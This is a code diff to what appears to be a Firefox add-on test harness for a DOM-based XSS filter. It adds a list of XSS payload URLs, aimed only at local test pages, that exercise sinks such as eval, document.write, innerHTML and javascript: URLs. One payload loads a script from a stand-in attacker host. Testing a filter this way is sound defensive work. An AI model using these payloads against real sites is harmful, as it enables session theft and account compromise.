@@ -5,11 +5,21 @@ var timers = require("sdk/timers");
 
 var {Navigator} = require("addon-navigate");
 
-var input = ["http://localhost/dom-xss/test/examples/dombased.php?sink=eval#alert('xss');"];
-// var input = ["http://www.yahoo.com"]; //, "http://yahoo.com"];
+var vectorInput = [
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=eval#alert('xss');",
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=function#alert('xss');",
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=setTimeout#alert('xss');",
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=scriptSrc#http://evil.com/xss.js",
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=scriptText#alert(\"XSS\")",
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=location#javascript:alert(\"XSS\")",
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=lochref#javascript:alert(1)",
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=docwrite#<script>alert(\"xss\")</script>",
+  "http://localhost/dom-xss/test/examples/dombased.php?sink=innerHTML#<img src=\"http://sdfgofgd.net/\" onerror=\"alert(1)\">"
+];
+
 
 var config = {
-  wait: 2, // wait for the other extension to start
+  wait: 1, // wait for the other extension to start
   ignoreFirst: 1 // remove first N time samples
 };
 
@@ -33,33 +43,44 @@ function processSite(s) {
     s.overhead = (s.on.avg - s.off.avg) / s.off.avg * 100;
 }
 
+var dxfHandler = {
+  extraProperties: function(site) {
+    site.on.attack = false;
+    if (site.off)
+      site.off.attack = false;
+  },
+  extraGlobals: function(w, cloner) {
+    w.onerror = msg => {
+      if (msg.includes("DOM-Based XSS"))
+        this.half.attack = true;
+      else
+        this.half.jsErrors.push(msg); // we could call the original handler
+    };
+  },
+  doOff: function() { 
+    prefs.set("security.dxf.rewrite", false);
+  },
+  doOn: function() {
+    prefs.set("security.dxf.rewrite", true);
+  },
+  end: function() {
+    this.doOn(); // reset
+    this.sites.forEach(processSite);
+    console.log("end", this.sites);
+    // system.exit(0);
+  }
+};
+
+var vectorHandler = {
+  end: function() {
+    dxfHandler.end.call(this);
+    this.sites.forEach(s => { if (!s.on.attack) throw s.url });
+    console.log("All sites are attacks")
+  }
+}
+vectorHandler.__proto__ = dxfHandler;
+
 timers.setTimeout(function() {
-  var n = new Navigator(input, {times: 4}, {
-    extraProperties: function(site) {
-      site.on.attack = false;
-      if (site.off)
-        site.off.attack = false;
-    },
-    extraGlobals: function(w, cloner) {
-      w.onerror = msg => {
-        if (msg.includes("DOM-Based XSS"))
-          this.half.attack = true;
-        else
-          this.half.jsErrors.push(msg); // we could call the original handler
-      };
-    },
-    doOff: function() { 
-      prefs.set("security.dxf.rewrite", false);
-    },
-    doOn: function() {
-      prefs.set("security.dxf.rewrite", true);
-    },
-    end: function() {
-      this.doOn(); // reset
-      this.sites.forEach(processSite);
-      console.log("end", this.sites);
-      // system.exit(0);
-    }
-  });
+  var n = new Navigator(vectorInput, {times: 1}, vectorHandler);
   n.start();
 }, config.wait * 1000);
